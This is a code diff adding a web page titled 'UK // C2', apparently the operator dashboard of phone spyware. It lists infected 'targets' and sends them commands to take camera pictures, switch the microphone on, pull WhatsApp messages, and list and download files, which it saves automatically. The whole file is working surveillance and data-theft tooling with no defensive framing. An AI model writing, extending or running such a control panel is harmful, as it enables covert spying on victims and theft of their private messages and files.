@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>UK // C2</title>
+<style>
+  :root { --bg: #050505; --panel: #0a0a0a; --red: #ff003c; --green: #00ff66; --text: #e0e0e0; }
+  * { box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); font-family: monospace; padding: 15px; margin: 0; }
+  h1 { color: var(--red); text-transform: uppercase; letter-spacing: 3px; font-size: 22px; margin-bottom: 20px; text-shadow: 0 0 10px rgba(255,0,60,0.5); }
+  select, button, input { background: #111; color: #fff; border: 1px solid #333; padding: 14px; border-radius: 8px; font-family: inherit; margin-bottom: 10px; width: 100%; font-size: 14px; }
+  button { background: var(--red); color: #000; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; letter-spacing: 1px; }
+  button:active { transform: scale(0.98); }
+  button.secondary { background: #222; color: #fff; }
+  .panel { border: 1px solid #222; padding: 15px; border-radius: 12px; margin-bottom: 15px; background: var(--panel); box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .log { height: 250px; overflow-y: scroll; font-size: 12px; color: #888; white-space: pre-wrap; margin-top: 10px; border-top: 1px solid #222; padding-top: 10px; }
+  .img-view { width: 100%; border-radius: 8px; display: none; margin-top: 10px; border: 1px solid #333; }
+  .file-list { list-style: none; padding: 0; margin: 10px 0 0; max-height: 200px; overflow-y: auto; }
+  .file-list li { padding: 8px; border-bottom: 1px solid #222; font-size: 12px; color: #aaa; cursor: pointer; }
+  .file-list li:active { background: #222; }
+</style>
+</head>
+<body>
+  <h1>UK // Control</h1>
+  
+  <div class="panel">
+    <select id="target-select"><option value="">Waiting for connection...</option></select>
+    <button onclick="refreshTargets()" class="secondary">Refresh Targets</button>
+  </div>
+
+  <div class="panel">
+    <div class="grid">
+      <button onclick="send('camera')">📸 Snap Camera</button>
+      <button onclick="send('mic', {on: true})">🎤 Mic ON</button>
+      <button onclick="send('mic', {on: false})">🔇 Mic OFF</button>
+      <button onclick="send('wa_read')">💬 Pull WA</button>
+      <button onclick="send('apps')">📱 App List</button>
+      <button onclick="send('files')">📁 File List</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3 style="margin:0 0 10px 0; font-size:14px; color:var(--red);">Output</h3>
+    <img id="cam-pic" class="img-view" />
+    <ul id="file-list" class="file-list"></ul>
+    <div id="log" class="log">Awaiting data...</div>
+  </div>
+
+<script>
+  const select = document.getElementById('target-select');
+  const log = document.getElementById('log');
+  const cam = document.getElementById('cam-pic');
+  const fileList = document.getElementById('file-list');
+  
+  const ws = new WebSocket(`wss://${location.host}/?role=dashboard`);
+  
+  ws.onmessage = (e) => {
+    const data = JSON.parse(e.data);
+    if (data.type === 'status') {
+      refreshTargets();
+      return;
+    }
+
+    if (data.type === 'image') {
+      cam.src = `data:image/jpeg;base64,${data.base64}`;
+      cam.style.display = 'block';
+    } else if (data.type === 'wa_data') {
+      log.textContent += `\n[WHATSAPP]\n${data.text}\n`;
+    } else if (data.type === 'apps') {
+      log.textContent += `\n[APPS]\n${data.apps.join('\n')}\n`;
+    } else if (data.type === 'files') {
+      fileList.innerHTML = data.files.map(f => `<li onclick="send('get_file', {path:'${f.path}'})">${f.name} (${Math.round(f.size/1024)} KB)</li>`).join('');
+      log.textContent += `\n[FILES] Loaded ${data.files.length} items\n`;
+    } else if (data.type === 'file_data') {
+      log.textContent += `\n[FILE] Received ${data.name} (${data.size} bytes)\n`;
+      // Auto download
+      const a = document.createElement('a');
+      a.href = `data:application/octet-stream;base64,${data.base64}`;
+      a.download = data.name;
+      a.click();
+    } else if (data.type === 'log') {
+      log.textContent += `\n[${data.tag}] ${data.msg}`;
+    }
+    log.scrollTop = log.scrollHeight;
+  };
+
+  async function refreshTargets() {
+    const r = await fetch('/api/targets');
+    const d = await r.json();
+    select.innerHTML = d.targets.map(c => `<option value="${c}">${c}</option>`).join('');
+  }
+
+  async function send(action, payload = {}) {
+    const id = select.value;
+    if (!id) return alert('No target selected');
+    await fetch('/api/command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id, action, payload })
+    });
+    log.textContent += `\n[CMD] Sent ${action}`;
+  }
+
+  refreshTargets();
+</script>
+</body>
+</html>
